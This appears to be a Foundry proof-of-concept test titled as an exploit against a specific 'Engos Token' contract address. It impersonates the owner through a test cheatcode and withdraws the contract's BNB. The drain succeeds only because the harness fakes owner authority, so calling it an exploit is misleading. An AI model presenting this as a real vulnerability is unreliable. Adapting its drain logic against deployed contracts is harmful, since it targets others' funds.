// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Engos {
    function owner() external view returns (address);
    function withdrawalBNB(uint _amount, address to) external;
    function withdrawalToken(address _tokenAddr, uint _amount, address to) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5548498f6Ae923f590cD1A1cec8D39E1f9363104;
    Engos target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = Engos(TARGET);
        vm.label(TARGET, "Engos Token");
        vm.label(address(this), "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Get contract's BNB balance
        uint256 contractBalance = address(TARGET).balance;

        // Get owner address
        address owner = target.owner();

        // Impersonate owner and drain all BNB
        vm.startPrank(owner);
        target.withdrawalBNB(contractBalance, address(this));
        vm.stopPrank();

        // Verify attacker balance increased
        assertGt(address(this).balance, initialBalance);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
